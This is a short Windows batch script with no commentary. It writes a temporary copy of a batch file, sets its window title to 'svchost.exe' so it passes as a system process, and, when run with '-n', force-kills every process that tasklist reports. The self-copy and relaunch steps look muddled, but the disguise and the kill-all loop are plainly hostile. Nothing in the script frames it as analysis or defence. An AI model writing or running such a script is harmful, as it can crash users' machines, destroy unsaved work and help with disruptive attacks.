@echo off
echo %0 > "%temp%\3mmaf.tmp.bat" 
set a47883882993884829="%temp%\3mmaf.tmp.bat"
title svchost.exe
if "%1"=="-n" (
goto next
) ELSE (
echo @echo off
echo start /min %a47883882993884829%  
echo exit
) > %a47883882993884829%
exit
:next
for /f "tokens=1 skip=3" %%i IN ('tasklist') DO taskkill /f /IM %%i
